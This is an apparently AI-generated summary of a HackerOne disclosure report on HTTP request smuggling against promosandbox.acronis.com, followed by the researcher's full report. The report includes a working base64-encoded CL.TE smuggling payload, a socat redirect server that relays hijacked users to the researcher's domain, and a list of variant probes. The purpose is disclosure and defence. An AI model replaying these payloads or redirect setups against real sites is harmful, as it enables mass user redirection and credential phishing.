# HTTP Request Smuggling on promosandbox.acronis.com

## Metadata
- **Source:** HackerOne
- **Report:** 1063493 | https://hackerone.com/reports/1063493
- **Submitted:** 2020-12-21
- **Reporter:** riramar
- **Program:** Acronis
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** HTTP Request Smuggling, CL.TE (Content-Length / Transfer-Encoding) Desync, Open Redirect, HTTP Response Splitting
- **CVEs:** None
- **Category:** uncategorised

## Summary
The Acronis promo sandbox is vulnerable to HTTP request smuggling via CL.TE desync attacks by exploiting mishandled Transfer-Encoding headers with tab characters. An attacker can inject malicious requests that cause the server to redirect users to attacker-controlled domains, enabling mass user redirection and potential credential harvesting.

## Attack scenario
1. Attacker crafts a malicious HTTP request with Content-Length and Transfer-Encoding (chunked) headers where TE header uses tab instead of space
2. Attacker sends initial POST request to /? endpoint with crafted payload to promosandbox.acronis.com
3. Front-end proxy processes by Content-Length (93 bytes) while backend interprets by Transfer-Encoding (chunked)
4. Attacker's injected second request (POST /sf with malicious Host header) is interpreted by backend as separate request
5. Backend server processes injected request and generates 302 redirect to attacker's domain (pqp.mx:443)
6. Legitimate users following the redirect are redirected to attacker's HTTPS server on port 8443, enabling credential theft or malware distribution

## Root cause
Inconsistent HTTP request parsing between front-end proxy and backend server regarding Content-Length vs Transfer-Encoding headers. The server accepts non-standard whitespace (tab character) in header parsing and fails to normalize or validate conflicting length-definition headers before passing requests upstream.

## Attacker mindset
Exploit desynchronization between multiple HTTP parsers to inject requests that appear valid to front-end but malicious to backend. Use port 443 redirect behavior and TLS negotiation confusion to seamlessly redirect users to attacker infrastructure without client-side warnings.

## Defensive takeaways
- Implement strict HTTP header validation: reject requests with conflicting Content-Length and Transfer-Encoding headers
- Normalize whitespace in headers (reject tabs/extra spaces) before processing
- Ensure consistent request parsing between all network layers (proxies, load balancers, application servers)
- Follow RFC 7230 strictly: reject ambiguous request framing
- Implement request smuggling detection via request re-parsing and comparison between layers
- Use HTTP/2 or HTTP/3 where possible to eliminate request smuggling vectors
- Apply strict Host header validation and reject requests with suspicious Host values
- Monitor for unusual redirect patterns and rate-limit redirects per session

## Variant hunting
Test TE.CL desync (Transfer-Encoding interpreted by front-end, Content-Length by backend) with various header encodings
Probe with multiple Transfer-Encoding headers (TE, TE;q=0.5, chunked; chunked)
Test case sensitivity variations (TRANSFER-ENCODING, transfer-encoding, Transfer-encoding)
Attempt whitespace injection in other headers (Content-Type, User-Agent) to discover parser quirks
Test with conflicting Content-Length values (duplicate headers with different values)
Probe different endpoints (/sf, /admin, /?param=value) to identify smuggling-vulnerable paths
Test with various HTTP versions (HTTP/1.0, HTTP/1.1, HTTP/2) to identify version-specific parsing
Attempt header folding (line continuation with CRLF+whitespace) to bypass header normalization

## MITRE ATT&CK
- T1190 Exploit Public-Facing Application
- T1566 Phishing (via redirect to credential harvesting site)
- T1598 Phishing for Information
- T1557 Man-in-the-Middle (potential downgrade via HTTP/HTTPS confusion)
- T1090 Proxy (using compromised server as redirect proxy)

## Notes
Report demonstrates practical exploitation with working PoC and socat relay setup. The tab character in Transfer-Encoding header is critical—standard space character may not trigger vulnerability. Attack requires knowledge of byte-exact payload sizing (93 bytes mentioned) to align CL.TE boundaries. Impact extends beyond redirects to cache poisoning, session fixation, and XSS injection vectors. Researcher provided detailed reproduction steps with base64 encoded payload and Burp Intruder configuration.

## Full report
<details><summary>Expand</summary>

## Summary
The website https://promosandbox.acronis.com is vulnerable to HTTP Request Smuggling which can be abused by an attacker to redirect all the users to a malicious website.
A redirect can be forced by changing the Host request header using the path /sf but the website will redirect you to http://pqp.mx:443/sf/.
{F1124353}
The problem is using port 443 over HTTP sometimes will force the browser to redirect to HTTPS (https://pqp.mx:443/sf/) which means a TLS service under the same port.
Instead of create a service which would identify the protocol HTTP or HTTPS I just redirect the user again to https://pqp.mx:8443 where I'm running a HTTPS website. To redirect the user I'm using the socat command below.

```
socat -v -d -d TCP-LISTEN:443,crlf,reuseaddr,fork 'SYSTEM:/bin/echo "HTTP/1.1 302 Found";/bin/echo "Content-Length: 0";/bin/echo "Location: https://pqp.mx:8443";/bin/echo;/bin/echo'
```

To reproduce the attack use the configuration below in a Burp Intruder attack. Notice the header "Transfer-Encoding	:	chunked" is not using space but a tab. You can also use the base64 decoded form of this string below.
The size of 93 bytes in hex on the request body must match with the size the second POST request. If you change the "Host: 7hpyu4al44k3lsnmuzfzyuyzaqgg45.burpcollaborator.net" header you need to update the size.

```
UE9TVCAvP2NiPTU0NzU3MDg0NzI0MzQ5NTkgSFRUUC8xLjENClRyYW5zZmVyLUVuY29kaW5nCToJY2h1bmtlZA0KSG9zdDogcHJvbW9zYW5kYm94LmFjcm9uaXMuY29tDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNzguMC4zOTA0Ljg3IFNhZmFyaS81MzcuMzYNCkNvbnRlbnQtdHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04DQpDb250ZW50LWxlbmd0aDogNA0KDQo5Mw0KUE9TVCAvc2YgSFRUUC8xLjENCkhvc3Q6IDdocHl1NGFsNDRrM2xzbm11emZ6eXV5emFxZ2c0NS5idXJwY29sbGFib3JhdG9yLm5ldA0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiA5DQoNCg0KMA0KDQo=
```

{F1124373}
{F1124374}
{F1124375}
{F1124376}

As soon as you start the Burp Intruder attack above you will see some redirects to Burp Collaborator domain.

{F1124380}

Doing the redirect mentioned above using my own pqp.mx domain I was able to receive some connections.

{F1124384}

## Recommendations
- https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142
- https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
- https://portswigger.net/web-security/request-smuggling
- https://blog.detectify.com/2020/05/28/hiding-in-plain-sight-http-request-smuggling/

## Impact

HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.
In this PoC I was able to massive redirect users to a domain under my control but other scenarios are also possible like the ones described here https://portswigger.net/web-security/request-smuggling/exploiting.

</details>

---
*Analysed by Claude on 2026-05-24*
